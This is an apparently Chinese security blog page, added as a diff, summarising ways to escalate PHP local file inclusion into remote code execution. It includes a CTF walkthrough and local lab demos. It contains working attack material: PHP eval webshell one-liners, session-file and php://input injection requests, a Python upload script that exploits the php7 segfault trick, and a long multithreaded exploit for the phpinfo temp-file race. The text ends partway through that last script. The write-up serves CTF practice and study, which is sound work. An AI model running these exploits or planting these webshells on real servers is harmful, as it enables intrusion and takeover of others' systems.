@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      LFItoRCE总结 | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>LFItoRCE总结</h2>
+  <p class="post-date">2019-05-14 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h1><h2 id="系统文件"><a href="#系统文件" class="headerlink" title="系统文件"></a>系统文件</h2><p><strong>/proc/self/environ | /proc/self/fd/… | /var/log/…</strong><br>都可写入一句话，但是需要有读权限</p>
+<h2 id="session-webshell"><a href="#session-webshell" class="headerlink" title="session webshell"></a>session webshell</h2><p>可能的Seesion保存路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;lib&#x2F;php&#x2F;session&#x2F; (PHP Sessions) ，&#x2F;tmp&#x2F; (PHP Sessions)</span><br></pre></td></tr></table></figure>
+<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><p>notebook<br>访问robots.txt得到文件名/php1nFo.php<br>分析ＵＲＬ:<strong><a href="http://ab222f22bccf47b5ab936fa859f47a1b44274b3671514637.changame.ichunqiu.com/action.php?module=php&amp;file=login" target="_blank" rel="noopener">http://ab222f22bccf47b5ab936fa859f47a1b44274b3671514637.changame.ichunqiu.com/action.php?module=php&amp;file=login</a></strong><br>一波乱fuzz，发现访问?module=&amp;file=login.php可以直接访问，但是不能任意文件读取．<br>题目提示文件包含phpinfo<br>访问：<strong><a href="http://ab222f22bccf47b5ab936fa859f47a1b44274b3671514637.changame.ichunqiu.com/action.php?module=&amp;file=php1nFo.php" target="_blank" rel="noopener">http://ab222f22bccf47b5ab936fa859f47a1b44274b3671514637.changame.ichunqiu.com/action.php?module=&amp;file=php1nFo.php</a></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">open_basedir做了限制只能访问&#x2F;var&#x2F;www&#x2F;html&#x2F;:&#x2F;tmp	&#x2F;var&#x2F;www&#x2F;html&#x2F;:&#x2F;tmp</span><br><span class="line">allow_url_include关闭，其实这里也用不了伪协议，做了限制．</span><br><span class="line">disbale_functions未做限制</span><br></pre></td></tr></table></figure>
+
+<p>文件包含还有个姿势就是利用日志＼临时文件＼session文件写入webshell进行包含．</p>
+<p>phpinfo给了session保存路径/tmp/SESS<br>猜测题目会对session文件写入登录信息，<strong>本地演示</strong>demo如下，写入Webshell.<br><img src="./2.png" alt=""></p>
+<p>注册账户名<code>&lt;?php eval($_GET[‘a’]);?&gt;</code>无法执行shell．估计被waf了，注册</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $_GET[a](base64_decode($_GET[‘c’]));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>访问：<a href="http://ab222f22bccf47b5ab936fa859f47a1b44274b3671514637.changame.ichunqiu.com/action.php?module=txt&amp;file=../../../tmp/SESS/sess_i8si4g0683pgb2gg9ghi5a7ql4&amp;a=system&amp;c=Y2F0IGZsYWcucGhw" target="_blank" rel="noopener">http://ab222f22bccf47b5ab936fa859f47a1b44274b3671514637.changame.ichunqiu.com/action.php?module=txt&amp;file=../../../tmp/SESS/sess_i8si4g0683pgb2gg9ghi5a7ql4&amp;a=system&amp;c=Y2F0IGZsYWcucGhw</a><br><img src="./3.png" alt=""></p>
+<h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><p><img src="./1.png" alt=""></p>
+<h2 id="ctf"><a href="#ctf" class="headerlink" title="ctf"></a>ctf</h2><p>WEB include</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'path'</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span>($_REQUEST[<span class="string">'path'</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'phpinfo.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong><a href="https://www.anquanke.com/post/id/177491" target="_blank" rel="noopener">https://www.anquanke.com/post/id/177491</a></strong><br>直接读flag.php无回显，考虑命令执行，使用<code>php://input POSＴ</code>数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &#96;cat dle345aae.php&#96;; ?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="./4.png" alt=""></p>
+<h1 id="LFI-php7崩溃"><a href="#LFI-php7崩溃" class="headerlink" title="LFI+php7崩溃"></a>LFI+php7崩溃</h1><p>当不存在phpinfo界面时，可以利用<code>php7 segment fault</code>特性。<br>所谓的段错误（segment fault）就是指访问的内存超过了系统所给这个程序的内存空间<br><img src="./10.png" alt=""></p>
+<p>我们可以利用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ip&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;string.strip_tags&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p>这样的方式，使php执行过程中出现 <strong>Segment Fault</strong>，这样如果在此同时上传文件，那么临时文件就会被保存在<code>/tmp</code>目录，不会被删除：</p>
+<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>www目录下的文件和内容<br><img src="./11.png" alt=""></p>
+<p>直接执行报错，触发<code>php7 segment fault</code>特性<br><img src="./12.png" alt=""></p>
+<p>编写exp，利用www目录下<strong>dir.php</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">file_data=&#123;</span><br><span class="line">	<span class="string">'file'</span>: BytesIO(<span class="string">"&lt;?php eval($_GET[1]);"</span>)</span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">"http://127.0.0.1:8082/lfi.php?file=php://filter/string.strip_tags/resource=/etc/passwd"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	r=requests.post(url=url,files=file_data,allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	url=<span class="string">"http://127.0.0.1:8082/dir.php"</span></span><br><span class="line">	r=requests.get(url)		</span><br><span class="line">	print(r.content)</span><br></pre></td></tr></table></figure>
+<p>包含文件，执行Shell<br><img src="./13.png" alt=""></p>
+<h1 id="phpinfo缓存文件"><a href="#phpinfo缓存文件" class="headerlink" title="phpinfo缓存文件"></a>phpinfo缓存文件</h1><blockquote>
+<p>当攻击网页时找不到可包含webshell，若网站存在phpinfo();界面，配置信息<code>file_uploads = on。</code><br>可以借助访问phpinfo界面是产生的缓存临时目录写入webshell。</p>
+</blockquote>
+<p>使用py脚本可以抓取缓存文件名，为了阻止php删除缓存过快，添加垃圾信息上传。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from io import BytesIO</span><br><span class="line">import re</span><br><span class="line">file_data&#x3D;&#123;</span><br><span class="line">	&#39;file&#39;: BytesIO(&quot;&lt;?php echo &#39;test&#39;;&quot;)</span><br><span class="line">&#125;</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;phpinfo.php&quot;</span><br><span class="line">r&#x3D;requests.post(url&#x3D;url,files&#x3D;file_data,allow_redirects&#x3D;False)</span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure>
+<p>在php删除缓存文件时候成功抓取文件名<br><img src="./5.png" alt=""></p>
+<p>引用p神分析:<a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a></p>
+<blockquote>
+<p>1.发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据<br>2.因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大<br>3.php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接<br>4.所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包<br>5.此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除<br>6.利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell</p>
+</blockquote>
+<p>我们需要在<code>phpinfo</code>产生缓存文件之时并包含，缓存文件内容写入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&#39;&#x2F;tmp&#x2F;od0d&#39;, &#39;&lt;?&#x3D;eval($_REQUEST[1])?&gt;&#39;)?&gt;</span><br></pre></td></tr></table></figure>
+<p>创建webshell，防止tmp文件被删除。<br>三处圈圈地方根据个人需要进行修改即可<br><img src="./6.png" alt=""></p>
+<p>执行py脚本<br><img src="./7.png" alt=""><br><img src="./8.png" alt=""></p>
+<p>访问：<strong><a href="http://127.0.0.1:8080/lfi.php?file=/tmp/od0d&amp;1=system(&#39;ls&#39;)" target="_blank" rel="noopener">http://127.0.0.1:8080/lfi.php?file=/tmp/od0d&amp;1=system(&#39;ls&#39;)</a>;</strong><br>成功写入webshell<br><img src="./9.png" alt=""></p>
+<h2 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(host, port)</span>:</span></span><br><span class="line">    TAG=<span class="string">"Security Test"</span></span><br><span class="line">    PAYLOAD=<span class="string">"""%s\r</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents('/tmp/od0d', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\r"""</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">"""-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r"""</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">"A"</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">"""POST /phpinfo.php?a="""</span>+padding+<span class="string">""" HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: """</span> + padding + <span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s"""</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script   </span></span><br><span class="line">    LFIREQ=<span class="string">"""GET /lfi.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpInfoLFI</span><span class="params">(host, port, phpinforeq, offset, lfireq, tag)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    </span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadWorker</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, e, l, m, *args)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span>                </span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"\nGot it! Shell created in /tmp/g"</span></span><br><span class="line">                    self.event.set()</span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOffset</span><span class="params">(host, port, phpinforeq)</span>:</span></span><br><span class="line">    <span class="string">"""Gets offset of tmp_name in the php output"""</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    </span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i        </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">"0\r\n\r\n"</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"No php tmp_name in phpinfo output"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"found %s at %i"</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"LFI With PHPInfo()"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-="</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage: %s host [port] [threads]"</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with hostname %s: %s"</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with port %d: %s"</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with poolsz %d: %s"</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Getting initial offset..."</span>,  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Spawning worker pool (%d)..."</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">"\r% 4d / % 4d"</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Woot!  \m/"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">":("</span></span><br><span class="line">    <span 